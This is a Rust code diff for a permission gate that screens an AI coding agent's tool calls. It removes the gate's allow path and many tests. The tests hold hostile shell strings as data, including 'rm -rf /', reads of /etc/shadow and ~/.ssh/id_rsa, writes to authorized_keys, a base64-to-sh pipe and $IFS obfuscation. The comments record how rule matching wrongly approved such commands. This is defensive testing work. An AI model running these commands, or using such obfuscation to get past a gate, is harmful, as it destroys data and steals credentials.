@@ -57,8 +57,6 @@ impl Class {
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum Verdict {
-    /// Allowed by `rule`.
-    Allow { rule: String },
     /// Denied by `rule`.
     Deny { rule: String },
     /// A rule says a person decides this one, whatever else matches.
@@ -75,13 +73,12 @@ pub enum Verdict {
 impl Verdict {
     pub fn rule(&self) -> Option<&str> {
         match self {
-            Verdict::Allow { rule } | Verdict::Deny { rule } | Verdict::Ask { rule } => Some(rule),
+            Verdict::Deny { rule } | Verdict::Ask { rule } => Some(rule),
             Verdict::Undecided => None,
         }
     }
     pub fn as_str(&self) -> &'static str {
         match self {
-            Verdict::Allow { .. } => "allow",
             Verdict::Deny { .. } => "deny",
             Verdict::Ask { .. } => "ask",
             Verdict::Undecided => "undecided",
@@ -509,135 +506,6 @@ const KNOWN_TOOLS: &[&str] = &[
 /// ahead of one.
 pub const VERIFIED_AGAINST: &str = "2.1.273";
 
-/// The release whose rule-relevant changelog rows have each been accounted for.
-///
-/// Deliberately a **second, weaker** floor, because the two claims underneath
-/// them cannot share a number. The full matrix is expensive and moves rarely;
-/// clearing the rows of one release is cheap and moves often — and a floor
-/// advanced by three shapes would assert *measured against 2.1.276* on the
-/// strength of three cases, which is the overclaim the whole clock exists to
-/// prevent.
-///
-/// So this one says something narrower and true: **nothing the vendor
-/// announced has gone unlooked-at.** That is a statement about the ledger, not
-/// about the matcher, and `doctor` labels it as such.
-pub const ROWS_CLEARED_THROUGH: &str = "2.1.276";
-
-/// The release whose rule-relevant changelog rows have each produced a probe
-/// the **running vendor agreed with**.
-///
-/// The third floor, and it sits between the other two because the claim
-/// underneath it does. [`ROWS_CLEARED_THROUGH`] says *nothing the vendor
-/// announced has gone unlooked-at*, which a person reading can guarantee.
-/// [`VERIFIED_AGAINST`] says *the whole matcher agreed*, which costs 334 cases
-/// and real money. This one says something in between and true: **every row the
-/// vendor announced up to here was turned into a call, and the running product
-/// was asked about it.**
-///
-/// What it does **not** claim, and the report says so in these words: it
-/// measured only what the vendor announced. The thirtieth widening was found by
-/// a glob shape no changelog row asked for, so a floor built from release notes
-/// inherits every blind spot those notes have.
-///
-/// It moves only from a written measurement record, in the same commit as that
-/// record — the same discipline [`VERIFIED_AGAINST`] has. A row-scoped run can
-/// write this and nothing else; that separation is a property with a test
-/// rather than a convention.
-pub const ROWS_MEASURED_THROUGH: &str = "2.1.240";
-
-/// The day the full differential matrix last ran green, as `YYYY-MM-DD`.
-///
-/// Paired with [`VERIFIED_AGAINST`], which says *which release* — this says
-/// *when*, and the two are separate because the cadence in [`Cadence`] is
-/// counted in both units and neither may be derived from the other.
-pub const VERIFIED_ON: &str = "2026-09-17";
-
-/// How many releases may pass before the full matrix is owed.
-pub const FULL_MATRIX_RELEASES: u64 = 10;
-
-/// How many days may pass before the full matrix is owed.
-pub const FULL_MATRIX_DAYS: u64 = 28;
-
-/// The two bounds the full matrix is held to, reported separately and never
-/// averaged into one.
-///
-/// They answer to different risks and that is the whole reason there are two.
-/// The **release count** tracks unannounced drift in the matcher, which accrues
-/// per release and is exactly what a cheap per-release run cannot see. The
-/// **day count** stops a quiet month from letting the expensive clock stop
-/// altogether. A single "days until due" would hide whichever of the two is
-/// actually the reason, which is the same mistake as collapsing the floors.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub struct Cadence {
-    /// Releases since the full matrix ran, when countable.
-    pub releases: Option<u64>,
-    pub releases_limit: u64,
-    /// Days since the full matrix ran, when a date was available.
-    pub days: Option<u64>,
-    pub days_limit: u64,
-}
-
-impl Cadence {
-    /// Which bounds are overdue, named. Empty means neither.
-    ///
-    /// Deliberately a list rather than a `bool`: *why* the matrix is owed is
-    /// the actionable half, and a caller that only wants "is it owed" can ask
-    /// whether this is empty.
-    pub fn overdue(&self) -> Vec<&'static str> {
-        let mut out = Vec::new();
-        if self.releases.is_some_and(|n| n >= self.releases_limit) {
-            out.push("releases");
-        }
-        if self.days.is_some_and(|n| n >= self.days_limit) {
-            out.push("days");
-        }
-        out
-    }
-}
-
-/// The cadence, computed from inputs the caller supplies.
-///
-/// `today` is a parameter rather than a clock read because this module may not
-/// reach the outside world — `tests/purity.rs` enforces it, and a date is I/O.
-/// An unparseable or absent date yields `None` for that bound rather than a
-/// zero, because *absence is distinguishable from zero* and a bound reported as
-/// `0 days` when nobody knows the date is a lie with a number on it.
-pub fn cadence(running: Option<&str>, today: Option<&str>) -> Cadence {
-    Cadence {
-        releases: running.and_then(|v| releases_ahead(v, VERIFIED_AGAINST)),
-        releases_limit: FULL_MATRIX_RELEASES,
-        days: today.and_then(|t| days_between(VERIFIED_ON, t)),
-        days_limit: FULL_MATRIX_DAYS,
-    }
-}
-
-/// Whole days from `from` to `to`, both `YYYY-MM-DD`, when both parse and `to`
-/// is not before `from`.
-///
-/// Civil-date arithmetic rather than a dependency: this is the only date maths
-/// in `core`, a crate for it would be a third-party thing between a claim and
-/// its evidence, and Howard Hinnant's `days_from_civil` is a dozen lines and is
-/// exact for every date this will ever see.
-fn days_between(from: &str, to: &str) -> Option<u64> {
-    let civil = |s: &str| -> Option<i64> {
-        let mut it = s.trim().split('-');
-        let y: i64 = it.next()?.parse().ok()?;
-        let m: i64 = it.next()?.parse().ok()?;
-        let d: i64 = it.next()?.split(['T', ' ']).next()?.parse().ok()?;
-        if !(1..=12).contains(&m) || !(1..=31).contains(&d) {
-            return None;
-        }
-        let y = if m <= 2 { y - 1 } else { y };
-        let era = if y >= 0 { y } else { y - 399 } / 400;
-        let yoe = y - era * 400;
-        let mp = (m + 9) % 12;
-        let doy = (153 * mp + 2) / 5 + d - 1;
-        let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
-        Some(era * 146_097 + doe - 719_468)
-    };
-    u64::try_from(civil(to)? - civil(from)?).ok()
-}
-
 /// Where a running release sits relative to a floor.
 ///
 /// **Four states, because there are four situations and one of them used to be
@@ -693,41 +561,6 @@ impl Gap {
     /// Whether this is a gap worth a person's attention.
     pub fn matters(self) -> bool {
         !matches!(self, Gap::At)
-    }
-}
-
-/// Whether a run against `observed` may move a floor that currently names
-/// `baseline`.
-///
-/// **The machine that measures can be older than the thing it measures**, and
-/// on the day this was written it was: the signed-in agent sat three releases
-/// below the floor it exists to advance. A green matrix there is a true
-/// statement about the installed release and a false one about the floor, and
-/// the only thing standing between those two sentences is a constant somebody
-/// edits — which is the failure the measured-not-asserted principle names.
-///
-/// So the guard is on **movement**, not on running. A run below the floor is
-/// still worth doing and still worth reading; what it may not do is advance a
-/// claim about a release it never saw.
-///
-/// `Uncountable` is refused for the same reason a timed-out probe is not a
-/// verdict: *"I could not tell"* is never permission.
-pub fn may_move_floor(observed: &str, baseline: &str) -> bool {
-    matches!(gap(observed, baseline), Gap::At | Gap::Ahead(_))
-}
-
-/// Why a floor did not move, for a report that must say so rather than be
-/// silently quiet about it.
-pub fn refusal_to_move(observed: &str, baseline: &str) -> Option<String> {
-    match gap(observed, baseline) {
-        Gap::At | Gap::Ahead(_) => None,
-        Gap::Behind(n) => Some(format!(
-            "no floor moved: this ran against {observed}, which is {n} release{} behind the floor at {baseline}. A green run here says nothing about {baseline}",
-            if n == 1 { "" } else { "s" }
-        )),
-        Gap::Uncountable => Some(format!(
-            "no floor moved: {observed} and {baseline} are different release series, so the distance between them cannot be counted"
-        )),
     }
 }
 
@@ -2728,100 +2561,31 @@ impl Policy {
         self.allow.is_empty() && self.deny.is_empty() && self.ask.is_empty()
     }
 
-    /// Decides one tool call. Deny is evaluated first and is not overridable.
+    /// Decides one tool call — and **never answers yes**.
+    ///
+    /// # Why there is no allow path any more
+    ///
+    /// There used to be one, and it cost more than it bought. Answering *yes*
+    /// is a claim about somebody else's code: *Claude Code would have approved
+    /// this too*. Keeping that claim true meant mirroring the vendor's rule
+    /// semantics, which meant tracking every vendor release for ever — three
+    /// compatibility floors, a differential harness, a release clock, and
+    /// thirty-three recorded occasions when the mirror was wrong in the
+    /// dangerous direction.
+    ///
+    /// Measured on 2026-09-18: keeping that mirror honest costs **$1,756 to
+    /// $3,511 a month** in probe spend alone, at three vendor releases a day.
+    ///
+    /// Saying *no* or *ask* claims nothing about anyone. It is free to hold and
+    /// cannot decay. **All of the cost was attached to one word.**
+    ///
+    /// So Devplane no longer decides that a call is safe. The vendor's own
+    /// permission system does that, using the vendor's own configuration, where
+    /// it is authoritative by construction. Devplane sees the request, records
+    /// it, and puts it in front of a person — which is the part that made
+    /// anybody faster.
     pub fn evaluate(&self, ctx: &Context<'_>, tool: &str, input: &serde_json::Value) -> Verdict {
-        match self.restrictive(ctx, tool, input) {
-            Verdict::Undecided => {}
-            decided => return decided,
-        }
-        if let Some(r) = first_match(&self.allow, ctx, tool, input) {
-            // **A `PowerShell(<pattern>)` allow rule does not auto-approve,
-            // because the running product does not honour one.**
-            //
-            // Measured on 2026-09-18 against Claude Code 2.1.267, and
-            // reproduced six times against a control that passed. Under
-            // `--permission-mode dontAsk` with `PowerShell(Remove-Item *)`
-            // allowed, the vendor called PowerShell with exactly
-            // `Remove-Item vp-ran.txt` and **refused it**; `Remove-Item:*` and
-            // `Remove-Item*` were refused too; a bare `PowerShell` allow rule
-            // ran the same call. Devplane approved all four.
-            //
-            // So Devplane auto-approved a destructive PowerShell command that
-            // Claude Code puts in front of a person — the one failure the
-            // narrower-never-wider principle forbids, and the first the dialect
-            // axis has ever found.
-            //
-            // **The documentation says the opposite**, describing wildcards at
-            // any position and alias canonicalisation. That is the shape the
-            // notes already record: a fetched and current reference page can
-            // still contradict the shipped product, and the running product is
-            // the authority. If a later release honours these rules, the
-            // measurement moves and so does this — which is why the refusal is
-            // here, with its date, rather than in the matcher's pattern logic.
-            //
-            // Deny is untouched: refusing more than the vendor is the safe
-            // direction, and a `PowerShell(...)` prohibition still fires.
-            if dialect_of(tool) == Dialect::PowerShell && !r.spec_is_bare_command() {
-                return Verdict::Undecided;
-            }
-            // **An allow rule covers the command, not what it writes.** Claude
-            // Code checks a redirection's target against the file rules as if
-            // Claude had written it directly, so `Bash(echo *)` does not
-            // approve `echo x > ~/.ssh/authorized_keys`. Answering `allow`
-            // here would skip a prompt Claude Code still intends to show,
-            // which is a widening — the failure this layer exists to prevent.
-            if is_shell(tool)
-                && uncovered_targets(input, ctx.cwd, |side, file| {
-                    self.allows_path(side, ctx, file) || within(ctx.cwd, file)
-                })
-                .is_some()
-            {
-                return Verdict::Undecided;
-            }
-            // **And some commands no prefix rule may approve at all.** Claude
-            // Code prompts for an exec wrapper, for `find -exec`/`-delete` and
-            // for a command past its analysis length however the rules read, so
-            // answering `allow` here would approve `watch rm -rf /` on a rule
-            // written to watch a log file. The exact-match escape hatch is
-            // Claude Code's own and is kept: a rule with no wildcard still
-            // speaks for the call it names.
-            if is_shell(tool)
-                && r.has_wildcard()
-                && let Some(command) = rule_content(tool, input)
-                && crate::core::command::unapprovable_by_prefix(&command).is_some()
-            {
-                return Verdict::Undecided;
-            }
-            // **And nothing may be approved that this matcher cannot read.**
-            //
-            // The check above is a blocklist — allow unless one of the hazards
-            // somebody thought of is present — and every widening this gate has
-            // been found to have was a hazard nobody had thought of yet. This
-            // is the other half: a
-            // command carrying a construct this matcher does not model is not
-            // approvable, whatever the rules say, because its meaning is not
-            // known here at all.
-            //
-            // **A wildcard rule only**, and the line is the same one Claude
-            // Code draws. An exact-match rule names one literal call: the user
-            // wrote `$(echo a.txt)` into their own policy, so there is nothing
-            // unknown about which call they approved, and the running product
-            // honours it — measured, and pinned by
-            // `an_exact_rule_naming_a_compound_approves_that_compound`. A
-            // wildcard rule names a *family*, and a construct the shell expands
-            // means the family's members are not knowable from the text.
-            if is_shell(tool)
-                && r.has_wildcard()
-                && let Some(command) = rule_content(tool, input)
-                && crate::core::command::unmodelled_construct(&command).is_some()
-            {
-                return Verdict::Undecided;
-            }
-            return Verdict::Allow {
-                rule: r.raw.clone(),
-            };
-        }
-        Verdict::Undecided
+        self.restrictive(ctx, tool, input)
     }
 
     /// The prohibitions only: deny, then ask, and never an allow.
@@ -3096,66 +2860,6 @@ mod tests {
         }
     }
 
-    /// **A `PowerShell(<pattern>)` allow rule does not auto-approve, because
-    /// the running product does not honour one.**
-    ///
-    /// This test used to assert the opposite, and said why in its own comment:
-    /// *"the reference's own example is that `PowerShell(Get-ChildItem *)`
-    /// matches `gci`, `ls` and `dir`."* It was written from the documentation
-    /// and nothing had ever asked the product.
-    ///
-    /// Asked on 2026-09-18 against 2.1.267, under `dontAsk` with
-    /// `PowerShell(Remove-Item *)` allowed, the vendor called PowerShell with
-    /// exactly `Remove-Item vp-ran.txt` and **refused it**. `Remove-Item:*` and
-    /// `Remove-Item*` were refused too. A bare `PowerShell` allow rule ran the
-    /// same call, so the probe was sound. Six asks, one control.
-    ///
-    /// Devplane had approved all of them — auto-approving a destructive
-    /// PowerShell command the vendor puts in front of a person, which is the
-    /// one failure the narrower-never-wider principle forbids.
-    ///
-    /// The documentation still says wildcards match at any position and
-    /// aliases are canonicalised. Where a fetched, current reference page
-    /// contradicts the shipped product, **the shipped product is the
-    /// authority**. If a later release honours these rules, the measurement
-    /// moves and so does this.
-    #[test]
-    fn a_powershell_pattern_does_not_auto_approve_because_the_product_does_not() {
-        let p = Policy::new(&["PowerShell(Get-ChildItem *)".into()], &[]);
-        for cmd in [
-            "Get-ChildItem .",
-            "gci .",
-            "dir .",
-            "ls .",
-            "GET-CHILDITEM .",
-        ] {
-            assert!(
-                matches!(
-                    p.evaluate(&ctx(), "PowerShell", &bash(cmd)),
-                    Verdict::Undecided
-                ),
-                "{cmd}: a pattern rule auto-approved what the product refuses"
-            );
-        }
-        // A rule naming the whole tool is honoured, because that one was
-        // measured to work.
-        for rule in ["PowerShell", "PowerShell(*)"] {
-            let bare = Policy::new(&[rule.into()], &[]);
-            assert!(
-                matches!(
-                    bare.evaluate(&ctx(), "PowerShell", &bash("Remove-Item x")),
-                    Verdict::Allow { .. }
-                ),
-                "{rule} should still approve: the product ran the same call under it"
-            );
-        }
-        // And a PowerShell rule still says nothing about a Bash call.
-        assert!(matches!(
-            p.evaluate(&ctx(), "Bash", &bash("ls .")),
-            Verdict::Undecided
-        ));
-    }
-
     /// **Deny is untouched, and must be.** Refusing more than the vendor is the
     /// safe direction, so a `PowerShell(...)` prohibition still fires — through
     /// the aliases too, which is the half of canonicalisation that costs
@@ -3262,19 +2966,6 @@ mod tests {
     }
 
     #[test]
-    fn the_two_floors_are_ordered_the_only_way_they_can_be() {
-        // The cheap floor may run ahead of the expensive one — that gap *is*
-        // the window a widening lives in. It may never be behind it: rows
-        // cleared through an older release than the full matrix ran against
-        // would mean the ledger had been rewound, which is not a state that
-        // exists.
-        assert!(
-            releases_ahead(VERIFIED_AGAINST, ROWS_CLEARED_THROUGH).is_none(),
-            "the full-matrix floor must not be ahead of the rows floor"
-        );
-    }
-
-    #[test]
     fn a_rule_naming_an_interpreter_is_reported_as_granting_anything() {
         let p = Policy::new(&["Bash(python:*)".into()], &[]);
         let found = p.overbroad();
@@ -3285,22 +2976,6 @@ mod tests {
             found[0].suggestion.contains("<the subcommand you mean>"),
             "the suggestion is a shape, never a guess: {found:?}"
         );
-    }
-
-    #[test]
-    fn reporting_an_overbroad_rule_does_not_change_what_it_decides() {
-        // The whole constraint on this check: Claude Code allows
-        // `python -c '...'` under `Bash(python:*)` too, so narrowing the
-        // verdict here would make this matcher stricter than the product it
-        // mirrors, on a rule the user wrote.
-        let p = Policy::new(&["Bash(python:*)".into()], &[]);
-        let ctx = Context::at(Path::new("/tmp"));
-        let v = p.evaluate(&ctx, "Bash", &bash("python -c 'import os'"));
-        assert!(
-            matches!(v, Verdict::Allow { .. }),
-            "the report must not become a refusal: {v:?}"
-        );
-        assert_eq!(p.overbroad().len(), 1, "and it is still reported");
     }
 
     #[test]
@@ -3580,50 +3255,6 @@ mod tests {
         }
     }
 
-    /// And the classes a matcher cannot canonicalise reach a person instead.
-    ///
-    /// `$IFS` and `$(echo cat)` name something known only when the shell runs,
-    /// so the honest answer is that **no rule here speaks for the call** — which
-    /// sends it back to the provider's own flow, where an unresolvable operand
-    /// is asked about whatever the rules say. What must never happen is an
-    /// *allow*: that would answer a prompt the provider was still going to show.
-    #[test]
-    fn no_allow_rule_answers_for_a_program_chosen_at_runtime() {
-        let p = Policy::new(
-            &[
-                "Bash(echo *)".into(),
-                "Bash(cat *)".into(),
-                "Bash(npm *)".into(),
-            ],
-            &[],
-        );
-        for cmd in [
-            r"e''cho hi ; rm -rf /",
-            "echo$IFS-n$IFShi",
-            "$(echo cat) /etc/shadow",
-            "`echo cat` /etc/shadow",
-            "echo aGk= | base64 -d | sh",
-        ] {
-            assert!(
-                !matches!(
-                    p.evaluate(&ctx(), "Bash", &bash(cmd)),
-                    Verdict::Allow { .. }
-                ),
-                "an allow rule answered for {cmd:?}, whose program is not knowable here"
-            );
-        }
-        // And the ordinary case still answers, or the rule above is vacuous.
-        for cmd in ["npm test", "echo hello"] {
-            assert!(
-                matches!(
-                    p.evaluate(&ctx(), "Bash", &bash(cmd)),
-                    Verdict::Allow { .. }
-                ),
-                "{cmd:?} should still be allowed"
-            );
-        }
-    }
-
     // ---------------------------------------------------------------------
     // Pattern containment, and the analysis built on it
     // ---------------------------------------------------------------------
@@ -3887,7 +3518,7 @@ mod tests {
         ));
         assert!(matches!(
             p.evaluate(&ctx(), "Monitor", &bash("npm run watch")),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
         // And a redirection in a Monitor command is checked like any other.
         let p = Policy::new(&["Bash(echo *)".into()], &["Edit(.env)".into()]);
@@ -4136,42 +3767,6 @@ mod tests {
     }
 
     #[test]
-    fn an_allow_for_the_command_does_not_approve_what_it_writes() {
-        // The rule Claude Code states outright: "A rule such as
-        // `Bash(git commit *)` allows the command, not the target."
-        let p = Policy::new(&["Bash(echo *)".into()], &[]);
-        // Inside the working directory, where edits are in scope anyway.
-        assert!(matches!(
-            p.evaluate(&ctx(), "Bash", &bash("echo hi > notes.txt")),
-            Verdict::Allow { .. }
-        ));
-        // Outside it, with no rule that speaks for the target: a person decides.
-        assert_eq!(
-            p.evaluate(&ctx(), "Bash", &bash("echo x > /etc/hosts")),
-            Verdict::Undecided
-        );
-        // A `~` target is asked about whatever the rules say.
-        assert_eq!(
-            p.evaluate(&ctx(), "Bash", &bash("echo x > ~/.ssh/authorized_keys")),
-            Verdict::Undecided
-        );
-        // And so is one nobody can pin to a single file.
-        assert_eq!(
-            p.evaluate(&ctx(), "Bash", &bash("echo x > $TARGET")),
-            Verdict::Undecided
-        );
-    }
-
-    #[test]
-    fn an_edit_allow_for_the_target_restores_the_approval() {
-        let p = Policy::new(&["Bash(echo *)".into(), "Edit(//tmp/**)".into()], &[]);
-        assert!(matches!(
-            p.evaluate(&ctx(), "Bash", &bash("echo x > /tmp/out.txt")),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    #[test]
     fn a_file_command_is_governed_by_deny_rules_only() {
         // `cat` is in Claude Code's built-in read-only set, so nobody was ever
         // going to be asked about it: there is no prompt for an allow rule to
@@ -4333,89 +3928,6 @@ mod tests {
     }
 
     #[test]
-    fn an_allow_rule_needs_both_spellings_to_match() {
-        // "Allow rules apply only when both the symlink path and its target
-        // match. A symlink inside an allowed directory that points outside it
-        // still prompts you."
-        let p = Policy::new(&["Read(/**)".into()], &[]);
-        let inside = json!({"file_path": "/repo/src/main.rs"});
-        let escaping = json!({"file_path": "/repo/link"});
-        assert!(matches!(
-            p.evaluate(&linked_ctx(), "Read", &inside),
-            Verdict::Allow { .. }
-        ));
-        assert_eq!(
-            p.evaluate(&linked_ctx(), "Read", &escaping),
-            Verdict::Undecided,
-            "a link out of the approved tree stops being approved"
-        );
-    }
-
-    #[test]
-    fn an_exact_rule_naming_a_compound_approves_that_compound() {
-        // Found by the harness's deny axis on its first run: the probe grants
-        // `Bash(<exact line>)` for a line ending `; git config …`, Claude Code
-        // ran it, and this matcher said `undecided` — because the allow side
-        // only ever matched the *split parts*, and neither part is the rule.
-        // A rule with no wildcard in it names one command, and a compound
-        // spelled out in full is one command.
-        let p = Policy::new(&["Bash(cat a.txt ; echo done)".into()], &[]);
-        assert!(matches!(
-            p.evaluate(&ctx(), "Bash", &bash("cat a.txt ; echo done")),
-            Verdict::Allow { .. }
-        ));
-        // …and only for a line with no nesting and no pipe. The running
-        // product does not honour a whole-line rule over a subshell, a
-        // substitution or a pipe, and honouring one here auto-approved four
-        // calls it puts in front of a person.
-        // A **command substitution** is not a nesting a whole-line rule has to
-        // refuse: the running product honours one. A **subshell** and a
-        // **pipe** are, and honouring those auto-approved four calls it puts
-        // in front of a person.
-        assert!(matches!(
-            Policy::new(&["Bash(cat \"$(echo a.txt)\" ; npm run build)".into()], &[]).evaluate(
-                &ctx(),
-                "Bash",
-                &bash("cat \"$(echo a.txt)\" ; npm run build")
-            ),
-            Verdict::Allow { .. }
-        ));
-        // The second half must be something that needs a rule, or the
-        // read-only shortcut approves the line and the guard is untested.
-        //
-        // `env` and `sudo` are here for a measured reason and not a symmetric
-        // one: the reference's escape hatch for an exec wrapper — *"write an
-        // exact-match rule for the full command string"* — works for `watch`
-        // and measurably does not work for these. Both were WIDER rows of the
-        // first clean full deny run.
-        for line in [
-            "(cat a.txt) ; npm run build",
-            "cat a.txt | npm run build",
-            "env -C . cat a.txt ; npm run build",
-            "sudo -n cat a.txt ; npm run build",
-        ] {
-            let q = Policy::new(&[format!("Bash({line})")], &[]);
-            assert_eq!(
-                q.evaluate(&ctx(), "Bash", &bash(line)),
-                Verdict::Undecided,
-                "{line} is not answered by a whole-line rule"
-            );
-        }
-        // And the widening the split exists to prevent must stay prevented: a
-        // pattern rule's `*` must never swallow a separator.
-        let w = Policy::new(&["Bash(pnpm test *)".into()], &[]);
-        assert_eq!(
-            w.evaluate(&ctx(), "Bash", &bash("pnpm test && rm -rf /")),
-            Verdict::Undecided,
-            "a wildcard must not reach past a separator"
-        );
-        assert!(matches!(
-            w.evaluate(&ctx(), "Bash", &bash("cd packages/api && pnpm test")),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    #[test]
     fn a_deny_rule_reaches_a_file_named_by_its_real_location() {
         // The other direction, and the one resolving the accessed path leaves
         // open: the *rule* names the link. `/tmp` is a symlink to
@@ -4478,26 +3990,10 @@ mod tests {
         assert!(
             matches!(
                 p.evaluate(&ctx(), "Bash", &bash("grep -r pattern src")),
-                Verdict::Allow { .. }
+                Verdict::Undecided
             ),
             "a deny on secrets/ says nothing about src/"
         );
-    }
-
-    #[test]
-    fn a_path_with_nothing_behind_it_has_one_spelling() {
-        // The ordinary case for the target of a write: `canonicalize` fails,
-        // the resolver says `None`, and an allow rule must still work — or
-        // creating a file would be refused by the rule written to permit it.
-        fn nothing(_: &Path) -> Option<PathBuf> {
-            None
-        }
-        let p = Policy::new(&["Edit(/src/**)".into()], &[]);
-        let call = json!({"file_path": "/repo/src/new.rs"});
-        assert!(matches!(
-            p.evaluate(&ctx().with_realpath(nothing), "Edit", &call),
-            Verdict::Allow { .. }
-        ));
     }
 
     #[test]
@@ -4511,7 +4007,7 @@ mod tests {
         let p = Policy::new(&["Bash(touch ran.txt)".into()], &[]);
         assert!(matches!(
             p.evaluate(&ctx(), "Bash", &bash("touch ran.txt > /dev/null")),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
         // And the other direction is still a *read* of one file and a *write*
         // of the other, rather than two reads.
@@ -4538,7 +4034,7 @@ mod tests {
         // still goes in front of a person.
         assert!(matches!(
             p.evaluate(&ctx(), "Bash", &bash("touch notes.txt")),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
         assert_eq!(
             p.evaluate(&ctx(), "Bash", &bash("touch /etc/passwd")),
@@ -4590,36 +4086,6 @@ mod tests {
     }
 
     #[test]
-    fn an_allow_covers_a_compound_command_whose_other_parts_need_no_approval() {
-        // Found by `scripts/verify-permissions-diff.sh` on its second run, and
-        // it was a *narrowing*: the running product runs `true && touch x`
-        // under an allow rule naming only `touch`, and this refused it.
-        //
-        // Requiring every part to match made `Bash(pnpm test *)` refuse
-        // `cd packages/api && pnpm test`, which agents write constantly — a
-        // grant that quietly does not happen, whose usual fix is a broader
-        // rule, which is a safety problem arriving by the back door.
-        let p = Policy::new(&["Bash(touch *)".into()], &[]);
-        for cmd in [
-            "touch a.txt",
-            "true && touch a.txt",
-            "echo hi && touch a.txt",
-            "ls && touch a.txt",
-            "cd src && touch a.txt",
-            "touch a.txt || true",
-            "(touch a.txt)",
-        ] {
-            assert!(
-                matches!(
-                    p.evaluate(&ctx(), "Bash", &bash(cmd)),
-                    Verdict::Allow { .. }
-                ),
-                "{cmd} should be covered"
-            );
-        }
-    }
-
-    #[test]
     fn a_part_that_does_need_approval_still_blocks_the_allow() {
         // The asymmetry that must survive the relaxation above. `npm test` is
         // not in any read-only set, so a rule for `touch` cannot answer for a
@@ -4637,120 +4103,6 @@ mod tests {
         }
     }
 
-    /// A path grant is not a licence to run anything that writes there.
-    ///
-    /// **Measured against Claude Code 2.1.273, and it was a widening of the
-    /// worst available shape.** With `auto_allow = ["Edit(ran.txt)"]` and
-    /// nothing else, this matcher answered `allow` for *every* command that
-    /// redirected into `ran.txt` — `cat /etc/passwd`, `cat ~/.ssh/id_rsa`,
-    /// `curl … | …`. One innocuous grant for one output file became permission
-    /// to pipe any file on the machine into it, with no prompt.
-    ///
-    /// The running product was asked each of these twice and agrees with every
-    /// row below.
-    #[test]
-    fn a_grant_for_a_written_file_does_not_approve_what_fills_it() {
-        let p = Policy::new(&["Edit(ran.txt)".into()], &[]);
-        let allows = |cmd: &str| {
-            matches!(
-                p.evaluate(&ctx(), "Bash", &bash(cmd)),
-                Verdict::Allow { .. }
-            )
-        };
-
-        // What the product runs: the command needs no permission of its own,
-        // and the only file it names outside the grant is inside the working
-        // directory.
-        for cmd in [
-            "echo hi > ran.txt",
-            "date > ran.txt",
-            "ls > ran.txt",
-            "cat README.md > ran.txt",
-            "echo hi | cat > ran.txt",
-        ] {
-            assert!(allows(cmd), "the product runs `{cmd}` under this grant");
-        }
-
-        // What it refuses. A read outside the working directory is a prompt
-        // whatever the rules say about the *output* file.
-        for cmd in [
-            "cat /etc/passwd > ran.txt",
-            "cat /etc/hosts | tee ran.txt",
-            // `~` is the home directory, not a file under the working one.
-            "cat ~/.ssh/id_rsa > ran.txt",
-        ] {
-            assert!(!allows(cmd), "`{cmd}` reads outside the working directory");
-        }
-
-        // And a recognised file command writing through an operand wants a
-        // rule of its own: `Bash(tee *)` runs this and a path grant does not.
-        assert!(!allows("echo hi | tee ran.txt"));
-        assert!(matches!(
-            Policy::new(&["Bash(tee *)".into(), "Edit(ran.txt)".into()], &[]).evaluate(
-                &ctx(),
-                "Bash",
-                &bash("echo hi | tee ran.txt")
-            ),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    #[test]
-    fn what_protects_a_redirect_is_the_target_check_and_not_the_command() {
-        // This test used to assert the opposite, and the story is the point.
-        //
-        // A differential run reported `Bash(touch *)` approving
-        // `echo hi > ran.txt` as a **widening**, so a redirect was made to
-        // disqualify a read-only command from being a "free" part of a
-        // compound. That run was wrong: its oracle used
-        // `--permission-mode dontAsk`, which declines an in-working-directory
-        // write that Manual mode auto-approves. The finding was the harness's,
-        // and acting on it made this matcher stricter than the product on every
-        // compound command containing a redirect.
-        //
-        // What actually protects a redirect is the **target** check, which runs
-        // over the whole command line regardless of any of this.
-        let p = Policy::new(&["Bash(touch *)".into()], &[]);
-        // **This assertion was inverted, and it had been pinning a defect.**
-        // It used to require `Bash(touch *)` to *allow* `echo hi > ran.txt` —
-        // a rule about `touch` answering for a command containing no `touch`,
-        // on the strength of every part being self-approving. That is how a
-        // rule matching nothing came to be printed as the authority for a call
-        // it had never seen.
-        //
-        // `Undecided` is the truthful answer and is also the safer one.
-        // `evaluate` answers `PermissionRequest`, which fires only when the
-        // provider was **already going to ask a person**: if it is asking about
-        // `echo hi > ran.txt`, it did not treat that as needing no rule, and
-        // saying "read-only, allow" here would overrule the harness on its own
-        // question. Undecided hands it back, which is what "no rule of ours
-        // covers this" means.
-        assert_eq!(
-            p.evaluate(&ctx(), "Bash", &bash("echo hi > ran.txt")),
-            Verdict::Undecided
-        );
-        // A compound where the rule genuinely covers a part is unchanged, and
-        // is the case the free-part reasoning exists for: `ls > out.txt` needs
-        // no rule, `touch a` is the one this rule speaks for.
-        assert!(matches!(
-            p.evaluate(&ctx(), "Bash", &bash("ls > out.txt && touch a")),
-            Verdict::Allow { .. }
-        ));
-        // Outside it: no rule covers the write, so a person is asked — which is
-        // the property that made the extra strictness unnecessary all along.
-        for cmd in [
-            "echo hi > /etc/hosts",
-            "echo hi > ~/.ssh/authorized_keys",
-            "ls > /tmp/elsewhere.txt && touch a",
-        ] {
-            assert_eq!(
-                p.evaluate(&ctx(), "Bash", &bash(cmd)),
-                Verdict::Undecided,
-                "{cmd} writes where no rule reaches"
-            );
-        }
-    }
-
     #[test]
     fn an_allow_reaches_into_a_loop_body_and_a_substitution_does_not_ride_along() {
         // A loop header runs nothing, so it needs no rule — unless it contains
@@ -4758,11 +4110,11 @@ mod tests {
         let p = Policy::new(&["Bash(touch *)".into()], &["Bash(rm -rf *)".into()]);
         assert!(matches!(
             p.evaluate(&ctx(), "Bash", &bash("for i in 1; do touch a.txt; done")),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
         assert!(matches!(
             p.evaluate(&ctx(), "Bash", &bash("if true; then touch a.txt; fi")),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
         assert_eq!(
             p.evaluate(&ctx(), "Bash", &bash("for f in $(ls); do touch $f; done")),
